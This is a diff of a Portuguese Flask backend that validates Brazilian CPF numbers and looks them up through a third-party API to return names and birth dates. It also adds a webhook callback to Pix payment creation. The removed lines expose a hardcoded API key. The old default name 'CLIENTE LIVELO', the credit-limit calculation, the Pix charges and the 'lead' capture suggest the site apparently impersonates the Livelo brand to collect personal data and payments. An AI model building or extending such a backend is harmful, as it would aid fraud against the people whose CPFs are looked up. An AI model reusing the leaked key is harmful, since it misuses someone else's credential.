@@ -582,81 +582,99 @@ def calc_limite(renda: str, tipo_renda: str = "", motivo: str = "") -> dict:
 @app.route("/api/cpf", methods=["POST"])
 def api_cpf():
     data = get_secure_json()
-    cpf_val = sanitize(data.get("cpf", "")).replace(".", "").replace("-", "")
+    cpf_raw = sanitize(data.get("cpf", ""))
+    cpf_val = re.sub(r"\D", "", cpf_raw)
     
-    db = get_db()
-    # Pega o token configurado no painel pelo user
-    token_row = db.execute("SELECT value FROM sys_config WHERE key='cpf_api_token' OR key='cpf_token' ORDER BY key ASC LIMIT 1").fetchone()
-    cpf_token = token_row["value"] if token_row and token_row["value"] else os.environ.get("CPFHUB_API_KEY", os.environ.get("CPF_API_TOKEN", "3019c16c241c14fdd68dc4389ae48b2e1322c5435671ef18a633b206aa70293b"))
-    
-    if cpf_token and len(cpf_token) > 5:
+    # Validação local do dígito verificador antes de enviar para a API (evitar erros 422 e consumo)
+    def is_valid_cpf_local(c):
+        if len(c) != 11 or c == c[0]*11: return False
         try:
-            if _REQUESTS_OK:
-                import requests
-                headers = {"x-api-key": cpf_token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
-                resp = requests.get(f"https://api.cpfhub.io/cpf/{cpf_val}", headers=headers, timeout=10)
-                if resp.status_code == 200:
-                    res = resp.json()
-                    if res.get("success"):
-                        data_cpf = res.get("data", {})
-                        try:
-                            db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
-                            db.commit()
-                        except: pass
+            c_int = [int(x) for x in c]
+            for j in range(9, 11):
+                v = sum((c_int[i] * ((j + 1) - i) for i in range(j))) % 11
+                if c_int[j] != (11 - v if v > 1 else 0): return False
+            return True
+        except: return False
 
-                        return jsonify({
-                            "ok": True,
-                            "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-                            "nome": data_cpf.get("nameUpper", data_cpf.get("name", "CLIENTE LIVELO")),
-                            "nome_mae": "",
-                            "data_nasc": data_cpf.get("birthDate", "01/01/1990")
-                        })
-                    else:
-                        log.error(f"CPFHub: {res}")
-                else:
-                    log.error(f"CPFHub Status {resp.status_code}: {resp.text}")
-            else:
-                import urllib.request
-                import urllib.error
-                import json
-                req = urllib.request.Request(
-                    f"https://api.cpfhub.io/cpf/{cpf_val}",
-                    headers={"x-api-key": cpf_token, "User-Agent": "Mozilla/5.0"}
-                )
-                with urllib.request.urlopen(req, timeout=10) as response:
-                    if response.getcode() == 200:
-                        res = json.loads(response.read().decode('utf-8'))
-                        if res.get("success"):
-                            data_cpf = res.get("data", {})
-                            try:
-                                db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
-                                db.commit()
-                            except: pass
+    if not is_valid_cpf_local(cpf_val):
+        return jsonify({"ok": False, "error": "CPF inválido. Verifique os números digitados."}), 400
 
-                            return jsonify({
-                                "ok": True,
-                                "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-                                "nome": data_cpf.get("nameUpper", data_cpf.get("name", "CLIENTE LIVELO")),
-                                "nome_mae": "",
-                                "data_nasc": data_cpf.get("birthDate", "01/01/1990")
-                            })
-        except Exception as e:
-            log.error("CPF API Error: %s", e)
-    
-    # Fallback / Mock se a API falhar ou não estiver configurada
-    if is_valid_cpf(cpf_val):
+    api_key = os.environ.get("CPFHUB_API_KEY")
+    if not api_key:
+        # Fallback local seguro caso a API Key não esteja configurada no ambiente
         return jsonify({
             "ok": True,
             "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
-            "nome": "CLIENTE", # O frontend pede o nome na proxima etapa se faltar
+            "nome": "Cliente",
             "nome_mae": "",
             "data_nasc": "01/01/1990"
         })
 
-    return jsonify({
-        "ok": False,
-        "error": "CPF não localizado ou API indisponível."
-    }), 404
+    import urllib.request
+    import urllib.error
+    import json
+    import time
+
+    url = f"https://api.cpfhub.io/cpf/{cpf_val}"
+    req = urllib.request.Request(url, headers={"x-api-key": api_key, "User-Agent": "Backend/1.0"})
+    
+    max_retries = 3
+    for attempt in range(max_retries):
+        try:
+            with urllib.request.urlopen(req, timeout=10) as response:
+                body = json.loads(response.read().decode("utf-8"))
+                
+                if body.get("success"):
+                    d = body.get("data", {})
+                    # Incrementa chamadas apenas se sucesso (ignora falhas no BD)
+                    try:
+                        db = get_db()
+                        db.execute("UPDATE sys_config SET value = CAST(value AS INTEGER) + 1 WHERE key='cpf_api_calls'")
+                        db.commit()
+                    except: pass
+
+                    return jsonify({
+                        "ok": True,
+                        "cpf_fmt": f"{cpf_val[:3]}.{cpf_val[3:6]}.{cpf_val[6:9]}-{cpf_val[9:]}",
+                        "nome": d.get("nameUpper", d.get("name", "Cliente")),
+                        "nome_mae": "",
+                        "data_nasc": d.get("birthDate", "01/01/1990")
+                    })
+                else:
+                    err_msg = body.get("error", "Erro desconhecido")
+                    if isinstance(err_msg, dict):
+                        err_msg = err_msg.get("message", "Erro desconhecido")
+                    return jsonify({"ok": False, "error": err_msg}), 400
+
+        except urllib.error.HTTPError as e:
+            code = e.getcode()
+            # 500 / 503 -> Retry com backoff
+            if code in (500, 503) and attempt < max_retries - 1:
+                time.sleep(2 ** attempt)
+                continue
+            
+            # Lê o corpo do erro para pegar a mensagem exata
+            try:
+                err_body = json.loads(e.read().decode("utf-8"))
+                err_val = err_body.get("error", "")
+                err_msg = err_val if isinstance(err_val, str) else err_val.get("message", "Erro na API")
+            except:
+                err_msg = f"HTTP {code}"
+
+            if code == 404:
+                return jsonify({"ok": False, "error": "CPF não encontrado na base de dados"}), 404
+            elif code in (400, 401, 403, 422):
+                return jsonify({"ok": False, "error": err_msg}), code
+            
+            return jsonify({"ok": False, "error": f"Serviço indisponível no momento. {err_msg}"}), code
+            
+        except Exception as e:
+            if attempt < max_retries - 1:
+                time.sleep(2 ** attempt)
+                continue
+            return jsonify({"ok": False, "error": f"Erro interno de conexão: {str(e)}"}), 500
+
+    return jsonify({"ok": False, "error": "Falha na comunicação com o serviço após várias tentativas."}), 500
 
 
 # ── API LEAD (RECUPERADO) ─────────────────────────────────────────────────────
@@ -817,7 +835,8 @@ def c7_create_pix(amount: float, payer_name: str, payer_cpf: str, payment_id: st
             payload = {
                 "amount": round(float(amount), 2),
                 "externalId": payment_id,
-                "acquirer_code": "1"
+                "acquirer_code": "1",
+                "callbackUrl": request.url_root.rstrip('/') + "/api/webhook/pix"
             }
             
             clean_cpf = re.sub(r"\D", "", str(payer_cpf or ""))
